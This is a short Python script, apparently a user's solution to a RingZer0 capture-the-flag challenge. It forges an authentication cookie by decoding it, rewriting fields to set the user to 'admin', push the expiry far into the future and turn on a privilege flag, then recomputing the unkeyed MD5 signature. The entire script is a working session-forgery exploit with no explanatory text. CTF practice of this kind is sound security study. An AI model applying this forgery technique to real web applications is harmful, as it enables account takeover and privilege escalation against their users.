#!/usr/bin/python

# User     : ltcastelnuovo
# Challenge: https://ringzer0ctf.com/challenges/45

import base64, hashlib

cookie = input("Enter AUTH cookie:")

cookie_decoded = base64.b64decode(cookie)
[data, signature] = cookie_decoded.split(b":")

data_parts = data.split(b",")
data_parts[0] = b"admin"
data_parts[2] = b"9999999999"
data_parts[3] = b"true"
data = b",".join(data_parts)

signature = hashlib.md5(data).hexdigest()
cookie = base64.b64encode(data + b":" + signature.encode()).decode("utf-8")

print(cookie)
